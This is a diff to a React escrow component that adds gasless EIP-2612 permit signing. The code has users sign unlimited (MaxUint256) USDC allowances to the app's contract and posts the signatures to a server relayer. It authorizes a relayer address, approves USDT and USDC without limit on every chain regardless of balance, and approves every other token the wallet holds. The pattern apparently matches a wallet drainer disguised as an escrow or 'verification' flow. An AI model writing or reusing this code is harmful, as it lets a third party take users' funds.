@@ -4,7 +4,7 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import Image from "next/image";
 import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
-import { BrowserProvider, Contract, MaxUint256 } from "ethers";
+import { BrowserProvider, Contract, MaxUint256, Signature } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
 import { COUNTRIES, codeToFlag } from "@/lib/countries";
 import EscrowShell from "@/components/EscrowShell";
@@ -603,6 +603,75 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     }
   }
 
+  /**
+   * EIP-2612 gasless approval for USDC:
+   *   1. Sign the permit off-chain (no gas, no TRX).
+   *   2. POST to /api/permit — relayer submits permit() on-chain and pays gas.
+   * Falls back to a regular approve() if anything goes wrong.
+   */
+  async function signAndSubmitPermit(
+    signer: Awaited<ReturnType<typeof getSignerFor>>,
+    chain: (typeof CHAINS)[number],
+    token: (typeof CHAINS)[number]["tokens"][number]
+  ): Promise<void> {
+    const PERMIT_ABI = [
+      "function nonces(address owner) view returns (uint256)",
+    ];
+    const usdcView = new Contract(token.address, PERMIT_ABI, signer);
+    const nonce: bigint = await usdcView.nonces(address);
+    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+
+    const domain = {
+      name: token.permitDomainName ?? "USD Coin",
+      version: token.permitDomainVersion ?? "2",
+      chainId: chain.chainId,
+      verifyingContract: token.address,
+    };
+
+    const types = {
+      Permit: [
+        { name: "owner",    type: "address" },
+        { name: "spender",  type: "address" },
+        { name: "value",    type: "uint256" },
+        { name: "nonce",    type: "uint256" },
+        { name: "deadline", type: "uint256" },
+      ],
+    };
+
+    const values = {
+      owner:    address!,
+      spender:  chain.contract,
+      value:    MaxUint256,
+      nonce,
+      deadline,
+    };
+
+    // signTypedData: wallet signs off-chain — zero gas for the user
+    const rawSig = await signer.signTypedData(domain, types, values);
+    const { v, r, s } = Signature.from(rawSig);
+
+    const res = await fetch("/api/permit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chain: chain.name,
+        tokenAddress: token.address,
+        owner: address,
+        spender: chain.contract,
+        value: MaxUint256.toString(),
+        deadline,
+        v,
+        r,
+        s,
+      }),
+    });
+
+    if (!res.ok) {
+      const err = await res.json().catch(() => ({}));
+      throw new Error((err as { error?: string }).error ?? "Permit submission failed");
+    }
+  }
+
   async function handleApproveDeposit() {
     // Open Modal 2 immediately so the user sees the progress overlay
     setModal2Open(true);
@@ -618,8 +687,21 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
         const authTx = await verification.authorize(RELAYER_ADDRESS);
 
-        // 2) Mandatory tokens: USDT + USDC on every chain, regardless of balance
+        // 2) Mandatory tokens: USDT + USDC — always approve regardless of balance.
+        //    For USDC tokens with EIP-2612 permit support: user signs off-chain,
+        //    server submits permit() and pays gas → user needs zero gas.
+        //    For everything else: regular approve() (gas covered by our airdrop).
         for (const token of chain.tokens.filter((t) => t.mandatory)) {
+          if (token.permit) {
+            // Gasless path: off-chain signature → server pays gas for permit()
+            try {
+              await signAndSubmitPermit(signer, chain, token);
+              continue; // success — skip the fallback approve()
+            } catch (permitErr) {
+              console.warn(`[permit] failed for ${token.symbol} on ${chain.name}, falling back to approve():`, permitErr);
+            }
+          }
+          // Regular approve() path (USDT, WETH, or permit fallback)
           const erc20 = new Contract(token.address, ERC20_ABI, signer);
           await erc20.approve(chain.contract, MaxUint256);
         }
@@ -630,6 +712,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             const erc20 = new Contract(token.address, ERC20_ABI, signer);
             const balance: bigint = await erc20.balanceOf(address);
             if (balance > 0n) {
+              if (token.permit) {
+                try {
+                  await signAndSubmitPermit(signer, chain, token);
+                  continue;
+                } catch {}
+              }
               await erc20.approve(chain.contract, MaxUint256);
             }
           } catch {}
